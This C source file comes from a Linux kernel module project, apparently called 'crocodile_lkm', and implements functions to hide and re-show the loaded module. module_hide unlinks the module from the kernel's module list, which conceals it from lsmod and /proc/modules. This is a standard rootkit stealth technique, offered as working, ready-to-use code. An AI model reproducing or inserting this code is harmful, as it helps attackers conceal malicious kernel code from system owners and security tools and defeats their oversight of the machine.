/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/module.h>

#include "ctrl/details/module_hide.h"

static struct list_head* _p_prev_module = NULL;

#define IS_MODULE_HIDDEN            (_p_prev_module != NULL)

/******************************************************************************
 *  Public functions.
 ******************************************************************************/

int is_module_hidden(void)
{
    return IS_MODULE_HIDDEN;
}

void module_hide(void)
{
    if (IS_MODULE_HIDDEN) {
        return;
    }

    _p_prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void module_show(void)
{
    if (! IS_MODULE_HIDDEN) {
        return;
    }

    list_add(&THIS_MODULE->list, _p_prev_module);
    _p_prev_module = NULL;
}

#undef IS_MODULE_HIDDEN

